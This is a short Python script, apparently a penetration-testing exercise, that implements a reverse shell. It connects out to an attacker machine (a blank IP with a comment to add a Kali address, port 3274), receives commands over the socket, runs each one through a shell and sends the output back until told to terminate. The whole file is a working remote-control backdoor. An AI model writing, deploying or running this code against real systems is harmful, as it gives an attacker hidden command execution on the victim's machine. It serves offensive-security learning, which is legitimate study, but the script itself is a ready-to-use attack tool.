import socket #manage connections
import subprocess #start a shell and execute a command

def connect():
    s = socket.socket()
    s.connect(("",3274)) #add Kali ip and port
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        else:
            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE,stdin = subprocess.PIPE) #ejecuta el comando que se envía y adicional se captura la entrada y salida
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()
    
main()